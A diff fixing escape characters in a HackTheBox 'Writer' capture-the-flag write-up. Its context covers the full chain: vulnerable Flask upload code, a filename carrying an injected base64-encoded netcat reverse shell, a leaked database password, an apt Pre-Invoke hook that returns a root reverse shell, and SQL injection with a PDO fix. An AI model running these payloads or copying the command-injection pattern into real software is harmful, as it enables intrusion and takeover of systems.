@@ -7,7 +7,7 @@ image:  '/images/0xd4y-logo-gray.png'
 tags:   [SQLi, SMTP, RCE, APT]
 ---
 
-**This report can be read both on this site, and as its <a href = "https://0xd4y.github.io/reports/Writer%20Writeup.pdf\">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
+**This report can be read both on this site, and as its <a href = "https://0xd4y.github.io/reports/Writer%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
 
 ![](/images/0xd4y-logo-gray.png)
 
@@ -157,7 +157,7 @@ Request
 {% highlight bash %} 
 POST /dashboard/stories/add HTTP/1.1Host: 10.10.11.101  
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0  
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8  
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
 Accept-Language: en-US,en;q=0.5  
 Accept-Encoding: gzip, deflate  
 Content-Type: multipart/form-data; boundary=---------------------------12417370376638841362770592069  
@@ -170,30 +170,30 @@ Cookie: session=eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ.YSLw7w.2OHVWSzrpZAobEiyfxo94ul3lf
 Upgrade-Insecure-Requests: 1  
 Sec-GPC: 1  
   
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"author\"  
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="author"  
   
 0xd4y  
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"title\"  
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="title"  
   
 Writeup  
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"tagline\"  
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="tagline"  
   
 Writeup  
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"image\"; filename=\"\"  
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="image"; filename=""  
 Content-Type: application/octet-stream  
   
   
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"image_url\"  
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="image_url"  
   
 http://10.10.15.80/image.jpg  
-\-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\=\"content\"Thanks for reading!  
-\-----------------------------12417370376638841362770592069--
+-----------------------------12417370376638841362770592069  
+Content-Disposition: form-data; name="content"Thanks for reading!  
+-----------------------------12417370376638841362770592069--
 {% endhighlight %}
 
 Note the “image_url” parameter highlighted in red  
@@ -283,7 +283,7 @@ Response
 
 {% highlight bash %}
 Welcome # Virtual host configuration for writer.htb domain  
-&lt;VirtualHost \*:80&gt;  
+&lt;VirtualHost *:80&gt;  
        ServerName writer.htb  
        ServerAdmin admin@writer.htb  
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi       &lt;Directory /var/www/writer.htb&gt;  
@@ -330,22 +330,22 @@ Welcome # Virtual host configuration for writer.htb domain
 In particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an __init__.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:
 
 {% highlight python %}
-if request.method == \"POST\":        if request.files['image']:             image = request.files['image']            if \".jpg\" in image.filename:  
-                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = \"/img/{}\".format(image.filename)           else:$               error = \"File extensions must be in .jpg!\"               return render_template('add.html', error\=error)       if request.form.get('image_url'):  
-           image_url = request.form.get('image_url')           if \".jpg\" in image_url:               try:                   local_filename, headers = urllib.request.urlretrieve(image_url)  
-                   os.system(\"mv {} {}.jpg\".format(local_filename, local_filename))                   image = \"{}.jpg\".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
-                       image = image.replace('/tmp/','')                      os.system(\"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\".format(image, image))                       image = \"/img/{}\".format(image)  
-                   except PIL.UnidentifiedImageError:                       os.system(\"rm {}\".format(image))                       error = \"Not a valid image file!\"...  
+if request.method == "POST":        if request.files['image']:             image = request.files['image']            if ".jpg" in image.filename:  
+                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render_template('add.html', error=error)       if request.form.get('image_url'):  
+           image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:                   local_filename, headers = urllib.request.urlretrieve(image_url)  
+                   os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
+                       image = image.replace('/tmp/','')                      os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)  
+                   except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"...  
 
         if request.form.get('image_url'):  
-           image_url = request.form.get('image_url')           if \".jpg\" in image_url:               try:  
-                   local_filename, headers = urllib.request.urlretrieve(image_url)                   os.system(\"mv {} {}.jpg\".format(local_filename, local_filename))                   image = \"{}.jpg\".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
-                       image = image.replace('/tmp/','')                       os.system(\"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\".format(image, image))                       image = \"/img/{}\".format(image)                       cursor = connector.cursor()                       cursor.execute(\"UPDATE stories SET image = %(image)s WHERE id = %(id)s\", {'image':image, 'id':id})  
+           image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:  
+                   local_filename, headers = urllib.request.urlretrieve(image_url)                   os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
+                       image = image.replace('/tmp/','')                       os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)                       cursor = connector.cursor()                       cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})  
                        result = connector.commit()  
   
-                   except PIL.UnidentifiedImageError:                       os.system(\"rm {}\".format(image))                       error = \"Not a valid image file!\"                       return render_template('edit.html', error=error, results=results, id=id)  
-               except:                   error = \"Issue uploading picture\"                   return render_template('edit.html', error=error, results=results, id=id)           else:  
-               error = \"File extensions must be in .jpg!\"
+                   except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"                       return render_template('edit.html', error=error, results=results, id=id)  
+               except:                   error = "Issue uploading picture"                   return render_template('edit.html', error=error, results=results, id=id)           else:  
+               error = "File extensions must be in .jpg!"
 {% endhighlight %}
 
 Note the file was shortened to better emphasize the source code of the upload feature. Critically insecure code is highlighted in red, and the text highlighted in purple is the segment that the undermentioned exploit focuses on.
@@ -362,8 +362,8 @@ import os
 from flask import request  
   
 local_filename, headers = urllib.request.urlretrieve('http://10.10.15.80/.jpg/1.jpg;sleep')  
-print(\"The local_filename is\", local_filename)  
-os.system(\"mv {} {}.jpg\".format(local_filename, local_filename))
+print("The local_filename is", local_filename)  
+os.system("mv {} {}.jpg".format(local_filename, local_filename))
 {% endhighlight %}
 
 Observe the argument of the urllib.request.urlretrieve() function. The user is in control of this argument. If a user were to upload a file called 1.jpg;sleep, then the server will behave accordingly:
@@ -377,7 +377,7 @@ However, when changing the argument to be file:///home/0xd4y/business/hackthebox
 
 ### Reverse Shell
 
-After uploading a file with the name \`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;\`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`. A reverse shell was then returned as the www-data user:
+After uploading a file with the name `0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`. A reverse shell was then returned as the www-data user:
 
 {% highlight bash %}
 ┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]└──╼ $nc -lvnp 9001  
@@ -395,7 +395,7 @@ Privilege Escalation
 
 After enumerating multiple files in the box, it was found that there is a username and password in a mysql config file called /etc/mysql/my.cnf that points to the dev database:
 
-database = devuser \= djangouser  
+database = devuser = djangouser  
 password = DjangoSuperPassword
 
 One of Kyle’s passwords is located in the databases, albeit it is hashed:
@@ -440,7 +440,7 @@ Persistence on this account was maintained by grabbing john’s ssh key.
 John is part of the management group which has permission to edit the apt directory /etc/apt/apt.conf.d, a directory which is responsible for containing the apt configurations. As discovered using pspy, there is a cronjob running as root which performs the following command: /usr/bin/apt-get update. Therefore, a malicious configuration that returns a reverse shell can be added to the directory as follows:
 
 {% highlight bash %}
-john@writer:~$ echo 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 9001 >/tmp/f\"};' > /etc/apt/apt.conf.d/0xd4y-pwn
+john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 9001 >/tmp/f"};' > /etc/apt/apt.conf.d/0xd4y-pwn
 {% endhighlight %}
 
 When the cronjob runs again, a reverse shell is returned as the root user:
@@ -467,7 +467,7 @@ SQLi Mitigation (PDO)
 This machine contained multiple vulnerabilities, starting with the SQL injection in the /administrative page. The vulnerability lies in the following SQL statement that is performed on the user’s query:
 
 {% highlight sql %}
-\"Select \* From users Where username = '%s' And password = '%s'\" % (username, password)
+"Select * From users Where username = '%s' And password = '%s'" % (username, password)
 {% endhighlight %}
 
 This insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing. To mitigate SQL injection attacks, the current recommendation is to use PDO (PHP Data Objects). The following code does not directly pass the user input into the SQL statement. Rather, using PDO tells the server what the SQL query and the user-inputted data are. This is successfully performed because the instruction and user-input are sent separately to the database:
@@ -477,12 +477,12 @@ This insecure SQL statement allows an attacker to add a single quote in their us
   
 try {  
   
- $conn = new PDO(\"mysql:host=$servername;dbname=$dbname\", $db_username, $db_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = \"INSERT INTO users (username,password)  VALUES(:username,:password)\";  
+ $conn = new PDO("mysql:host=$servername;dbname=$dbname", $db_username, $db_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = "INSERT INTO users (username,password)  VALUES(:username,:password)";  
         $statement = $conn->prepare($query);  
-        $statement->execute(array(   ':username'\=> $username,   ':password'\=> $password  
+        $statement->execute(array(   ':username'=> $username,   ':password'=> $password  
         ));  
   
-} catch(PDOException $e) { echo \"Error: \" . $e->getMessage();  
+} catch(PDOException $e) { echo "Error: " . $e->getMessage();  
 }  
 $conn = null;  
   
